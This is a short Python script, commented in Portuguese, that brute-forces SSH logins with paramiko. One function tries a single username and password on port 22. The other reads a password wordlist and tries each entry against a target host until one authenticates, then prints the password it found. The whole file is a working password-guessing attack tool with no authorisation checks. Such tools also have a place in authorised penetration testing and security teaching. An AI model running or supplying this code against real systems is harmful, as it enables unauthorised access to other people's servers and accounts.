import paramiko


def ssh_connect(target, usuario, senha) -> bool:
    """
    Tenta uma única conexão SSH.
    Retorna True se autenticou com sucesso, False caso contrário.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=usuario, password=senha, timeout=5)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Erro de conexão: {e}")
        return False


def ssh_bruteforce(target, usuario, password_file):
    """
    Itera sobre o arquivo de senhas e tenta autenticar via SSH.
    Retorna a senha encontrada ou None.
    """
    try:
        with open(password_file, "r", errors="ignore") as f:
            senhas = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Arquivo não encontrado: {password_file}")
        return None

    print(f"Iniciando bruteforce em {target} com usuário '{usuario}'")
    print(f"Total de senhas: {len(senhas)}\n")

    for i, senha in enumerate(senhas, 1):
        print(f"[{i}/{len(senhas)}] Tentando: {senha}")
        if ssh_connect(target, usuario, senha):
            print(f"\n[+] Senha encontrada: {senha}")
            return senha

    print("\n[-] Nenhuma senha funcionou.")
    return None